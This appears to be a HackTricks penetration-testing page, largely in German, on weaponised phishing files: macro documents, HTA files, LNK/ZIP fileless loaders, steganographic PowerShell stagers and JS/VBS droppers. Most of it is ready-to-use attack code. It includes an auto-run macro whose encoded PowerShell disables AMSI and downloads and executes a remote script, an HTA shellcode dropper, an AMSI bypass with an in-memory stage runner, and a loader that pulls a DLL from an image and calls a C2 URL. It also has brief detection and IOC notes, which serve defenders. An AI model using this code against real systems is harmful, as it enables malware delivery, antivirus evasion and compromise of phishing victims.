# Phishing-Dateien & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt eine Validierung der Dateidaten durch, bevor eine Datei geöffnet wird. Die Validierung erfolgt in Form einer Identifikation der Datenstruktur anhand des OfficeOpenXML-Standards. Tritt während der Identifikation der Datenstruktur ein Fehler auf, wird die zu analysierende Datei nicht geöffnet.

In der Regel verwenden Word-Dateien mit Makros die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem die Dateiendung geändert wird, und dennoch die Makroausführungsfähigkeit beizubehalten.\
Zum Beispiel unterstützt eine RTF-Datei von Haus aus keine Makros, aber eine DOCM-Datei, die in RTF umbenannt wurde, wird von Microsoft Word behandelt und kann Makros ausführen.\
Die gleichen Interna und Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint etc.).

Sie können den folgenden Befehl verwenden, um zu prüfen, welche Dateiendungen von einigen Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf eine Remote-Vorlage verweisen (File –Options –Add-ins –Manage: Templates –Go), die macros enthalten, können ebenfalls macros „ausführen“.

### Externes Laden von Bildern

Gehe zu: _Insert --> Quick Parts --> Field_\
_**Kategorien**: Links and References, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Es ist möglich, macros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je häufiger sie verwendet werden, desto wahrscheinlicher ist es, dass AV sie entdeckt.

- AutoOpen()
- Document_Open()

#### Macros Code-Beispiele
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Metadaten manuell entfernen

Gehe zu **File > Info > Inspect Document > Inspect Document**, wodurch der Dokumenteninspektor geöffnet wird. Klicke **Inspect** und dann **Remove All** neben **Document Properties and Personal Information**.

#### Doc Extension

Wenn fertig, wähle im Dropdown **Save as type** und ändere das Format von **`.docx`** zu **Word 97-2003 `.doc`**.\
Mach das, weil du **can't save macro's inside a `.docx`** und es ein **Stigma** **around** die macro-enabled **`.docm`** extension gibt (z. B. das Vorschausymbol hat ein großes `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **legacy `.doc` extension der beste Kompromiss**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

Ein HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (such as VBScript and JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und läuft als eine „voll vertrauenswürdige“ Anwendung, ohne die Beschränkungen des Sicherheitsmodells eines Browsers.

Ein HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise zusammen mit **Internet Explorer** **installed** ist, wodurch **`mshta` dependant on IE** ist. Wenn dieser deinstalliert wurde, können HTAs nicht mehr ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcing NTLM Authentication

Es gibt mehrere Möglichkeiten, **NTLM authentication "remotely"** zu erzwingen, zum Beispiel kannst du **unsichtbare Bilder** in E-Mails oder HTML einfügen, auf die der Benutzer zugreift (auch HTTP MitM?). Oder dem Opfer die **Adresse von Dateien** schicken, die allein durch **Öffnen des Ordners** eine **Authentifizierung** auslösen.

**Prüfe diese Ideen und mehr auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen kannst, sondern auch **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Sehr effektive Kampagnen liefern ein ZIP, das zwei legitime Köderdokumente (PDF/DOCX) und eine bösartige .lnk enthält. Der Trick ist, dass der eigentliche PowerShell loader in den Rohbytes des ZIPs nach einem eindeutigen Marker gespeichert ist, und die .lnk ihn herauszieht und vollständig im Speicher ausführt.

Typischer Ablauf, implementiert durch den .lnk PowerShell One-Liner:

1) Finde das ursprüngliche ZIP an üblichen Orten: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und im übergeordneten Verzeichnis des aktuellen Arbeitsverzeichnisses.
2) Lese die ZIP-Bytes und finde einen hartkodierten Marker (z. B. xFIQCV). Alles nach dem Marker ist die eingebettete PowerShell payload.
3) Kopiere das ZIP nach %ProgramData%, entpacke es dort und öffne das Köder-.docx, um legitim zu wirken.
4) Umgehe AMSI für den aktuellen Prozess: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskiere die nächste Stufe (z. B. entferne alle #-Zeichen) und führe sie im Speicher aus.

Beispiel eines PowerShell-Skeletts, um die eingebettete Stufe auszuschneiden und auszuführen:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Hinweise
- Die Auslieferung missbraucht häufig vertrauenswürdige PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads filtern (liefert je nach IP/UA harmlose ZIPs).
- Die nächste Stufe entschlüsselt häufig base64/XOR shellcode und führt ihn via Reflection.Emit + VirtualAlloc aus, um Artefakte auf der Festplatte zu minimieren.

Persistence used in the same chain
- COM TypeLib hijacking des Microsoft Web Browser control, sodass IE/Explorer oder jede App, die es einbettet, die payload automatisch neu startet. Details und einsatzbereite Befehle hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
- .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Long-running business threads ending with links hosted under trusted PaaS domains.

## Steganography-delimited payloads in Bildern (PowerShell stager)

Aktuelle Loader-Ketten liefern ein obfuskiertes JavaScript/VBS, das einen Base64 PowerShell stager dekodiert und ausführt. Dieser stager lädt ein Image herunter (oft GIF), das eine Base64-kodierte .NET DLL enthält, die als Klartext zwischen eindeutigen Start-/End-Markern versteckt ist. Das Script sucht nach diesen Delimitern (in der Wildnis beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den Zwischen-Text, Base64-dekodiert ihn zu Bytes, lädt die Assembly im Speicher und ruft eine bekannte Entry-Methode mit der C2 URL auf.

Ablauf
- Stage 1: Archivierter JS/VBS dropper → decodiert eingebettetes Base64 → startet PowerShell stager mit -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → lädt Image herunter, extrahiert marker-delimited Base64, lädt die .NET DLL im Speicher und ruft deren Methode auf (z. B. VAI) und übergibt die C2 URL und Optionen.
- Stage 3: Der Loader holt das finale payload und injiziert es typischerweise via process hollowing in ein vertrauenswürdiges Binary (üblicherweise MSBuild.exe). Mehr zu process hollowing und trusted utility proxy execution hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-Beispiel, um eine DLL aus einem Image zu extrahieren und eine .NET-Methode im Speicher aufzurufen:

<details>
<summary>PowerShell stego payload-Extraktor und Loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Hinweise
- Dies ist ATT&CK T1027.003 (steganography/marker-hiding). Marker variieren zwischen Kampagnen.
- AMSI/ETW bypass und string deobfuscation werden üblicherweise angewendet, bevor die Assembly geladen wird.
- Erkennung: nach heruntergeladenen Bildern nach bekannten Delimitern scannen; PowerShell erkennen, das auf Bilder zugreift und sofort Base64‑Blobs dekodiert.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Grundlogik (abstrakt):
- Liest eigenen Dateiinhalt
- Findet einen Base64-Blob zwischen irrelevanten Zeichenketten
- Dekodiert zu ASCII‑PowerShell
- Führt aus mit `wscript.exe`/`cscript.exe`, die `powershell.exe` aufrufen

Erkennungsmerkmale
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Befehlszeile starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus Benutzer-Temp-Pfaden startet.

## Windows-Dateien zum Stehlen von NTLM-Hashes

Siehe die Seite über **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
